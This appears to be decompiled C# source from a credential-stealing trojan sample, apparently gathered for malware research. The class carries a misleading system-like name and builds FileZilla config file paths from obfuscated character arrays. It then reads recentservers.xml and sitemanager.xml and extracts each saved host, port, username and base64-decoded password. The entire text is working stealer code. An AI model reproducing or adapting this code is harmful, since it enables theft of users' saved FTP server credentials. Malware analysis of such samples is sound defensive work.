// Decompiled with JetBrains decompiler
// Type: SystemDataIDataReaderD
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

public class SystemDataIDataReaderD
{
  public static List<SystemComponentModelCultureInfoConverterb> Enum()
  {
    List<SystemComponentModelCultureInfoConverterb> cultureInfoConverterbList = new List<SystemComponentModelCultureInfoConverterb>();
    try
    {
      string str1 = string.Format(new string(new char[31]
      {
        '{',
        '0',
        '}',
        '\\',
        'F',
        'i',
        'l',
        'e',
        'Z',
        'i',
        'l',
        'l',
        'a',
        '\\',
        'r',
        'e',
        'c',
        'e',
        'n',
        't',
        's',
        'e',
        'r',
        'v',
        'e',
        'r',
        's',
        '.',
        'x',
        'm',
        'l'
      }), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      string str2 = string.Format(new string(new char[29]
      {
        '{',
        '0',
        '}',
        '\\',
        'F',
        'i',
        'l',
        'e',
        'Z',
        'i',
        'l',
        'l',
        'a',
        '\\',
        's',
        'i',
        't',
        'e',
        'm',
        'a',
        'n',
        'a',
        'g',
        'e',
        'r',
        '.',
        'x',
        'm',
        'l'
      }), (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
      if (File.Exists(str1))
        cultureInfoConverterbList.AddRange((IEnumerable<SystemComponentModelCultureInfoConverterb>) SystemDataIDataReaderD.Enum2(str1));
      if (File.Exists(str2))
        cultureInfoConverterbList.AddRange((IEnumerable<SystemComponentModelCultureInfoConverterb>) SystemDataIDataReaderD.Enum2(str2));
    }
    catch
    {
    }
    return cultureInfoConverterbList;
  }

  private static List<SystemComponentModelCultureInfoConverterb> Enum2(
    string Path)
  {
    List<SystemComponentModelCultureInfoConverterb> cultureInfoConverterbList = new List<SystemComponentModelCultureInfoConverterb>();
    try
    {
      XmlTextReader reader = new XmlTextReader(Path);
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.Load((XmlReader) reader);
      foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
      {
        SystemComponentModelCultureInfoConverterb cultureInfoConverterb = SystemDataIDataReaderD.Enum3(childNode);
        if (cultureInfoConverterb.Id1 != "UNKNOWN" && cultureInfoConverterb.Id1 != "UNKNOWN")
          cultureInfoConverterbList.Add(cultureInfoConverterb);
      }
    }
    catch
    {
    }
    return cultureInfoConverterbList;
  }

  private static SystemComponentModelCultureInfoConverterb Enum3(
    XmlNode xmlNode)
  {
    SystemComponentModelCultureInfoConverterb cultureInfoConverterb = new SystemComponentModelCultureInfoConverterb();
    try
    {
      foreach (XmlNode childNode in xmlNode.ChildNodes)
      {
        if (childNode.Name == "Host")
          cultureInfoConverterb.Id1 = childNode.InnerText;
        if (childNode.Name == "Port")
          cultureInfoConverterb.Id1 = cultureInfoConverterb.Id1 + ":" + childNode.InnerText;
        if (childNode.Name == "User")
          cultureInfoConverterb.Id2 = childNode.InnerText;
        if (childNode.Name == "Pass")
          cultureInfoConverterb.Id3 = Encoding.UTF8.GetString(Convert.FromBase64CharArray(childNode.InnerText.ToCharArray(), 0, childNode.InnerText.Length));
      }
    }
    catch
    {
    }
    finally
    {
      cultureInfoConverterb.Id1 = string.IsNullOrEmpty(cultureInfoConverterb.Id1) ? "UNKNOWN" : cultureInfoConverterb.Id1;
      cultureInfoConverterb.Id2 = string.IsNullOrEmpty(cultureInfoConverterb.Id2) ? "UNKNOWN" : cultureInfoConverterb.Id2;
      cultureInfoConverterb.Id3 = string.IsNullOrEmpty(cultureInfoConverterb.Id3) ? "UNKNOWN" : cultureInfoConverterb.Id3;
    }
    return cultureInfoConverterb;
  }
}
